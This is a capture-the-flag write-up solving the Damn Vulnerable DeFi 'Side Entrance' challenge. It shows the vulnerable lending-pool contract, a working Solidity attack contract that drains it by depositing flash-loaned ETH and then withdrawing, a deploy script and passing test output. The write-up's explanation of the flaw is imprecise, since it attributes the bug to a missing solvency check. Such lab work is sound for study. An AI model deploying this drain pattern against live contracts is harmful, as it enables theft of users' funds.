<img src="https://github.com/wasny0ps/Damn-Vulnerable-DeFi/blob/main/src/4.png">

# Target Contract Review

Given contract.

**SideEntranceLenderPool.sol**

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "solady/src/utils/SafeTransferLib.sol";

interface IFlashLoanEtherReceiver {
    function execute() external payable;
}

/**
 * @title SideEntranceLenderPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract SideEntranceLenderPool {
    mapping(address => uint256) private balances;

    error RepayFailed();

    event Deposit(address indexed who, uint256 amount);
    event Withdraw(address indexed who, uint256 amount);

    function deposit() external payable {
        unchecked {
            balances[msg.sender] += msg.value;
        }
        emit Deposit(msg.sender, msg.value);
    }

    function withdraw() external {
        uint256 amount = balances[msg.sender];
        
        delete balances[msg.sender];
        emit Withdraw(msg.sender, amount);

        SafeTransferLib.safeTransferETH(msg.sender, amount);
    }

    function flashLoan(uint256 amount) external {
        uint256 balanceBefore = address(this).balance;

        IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();

        if (address(this).balance < balanceBefore)
            revert RepayFailed();
    }
}

```

`deposit()` :  This function allows users to deposit Ether into the lending pool. The deposited Ether is added to the user's balance.

`withdraw()` : Users can withdraw their deposited Ether from the lending pool. The function transfers the Ether from the user's balance back to their address.

`flashLoan()` : This function is the vulnerable part of the contract. It allows anyone to borrow a specified amount of Ether from the lending pool. The borrower must implement the execute() function in the IFlashLoanEtherReceiver interface to define the logic for the flash loan.

Challlenge's message:

> A surprisingly simple pool allows anyone to deposit ETH, and withdraw it at any point in time.
It has 1000 ETH in balance already, and is offering free flash loans using the deposited ETH to promote their system.
Starting with 1 ETH in balance, pass the challenge by taking all ETH from the pool.

# Subverting

The SideEntranceLenderPool contract is part of the Damn Vulnerable DeFi project and is used to simulate a lending pool where users can deposit and withdraw funds. However, this contract has a vulnerability that allows an attacker to exploit it and borrow more funds than they actually have.


The vulnerability in this contract arises from the fact that the flashLoan() function does not check if the borrower has sufficient funds to repay the loan. This allows an attacker to borrow a large amount of Ether from the pool, manipulate the borrowed funds, and then repay the loan with the manipulated funds.

```solidity
pragma solidity ^0.8.0;

import "../side-entrance/SideEntranceLenderPool.sol";

contract AttackSideEntrance{

    SideEntranceLenderPool pool;

    function attack(address _pool)external payable{
        pool = SideEntranceLenderPool(_pool);
        pool.flashLoan(address(pool).balance);
        pool.withdraw();
        payable(msg.sender).transfer(address(this).balance);
    }

    function execute()external payable{
        pool.deposit{value: msg.value}();
    }

    fallback() external payable{}

}
```

```js
const AttackFactory = await ethers.getContractFactory('AttackSideEntrance', deployer);
attack = await AttackFactory.deploy();
await attack.connect(player).attack(pool.address);
```

Solve the challenge.

```powershell
 [Challenge] Side entrance
    ✔ Execution (44ms)


  1 passing (1s)

Done in 2.56s.
```


**_by wasny0ps_**
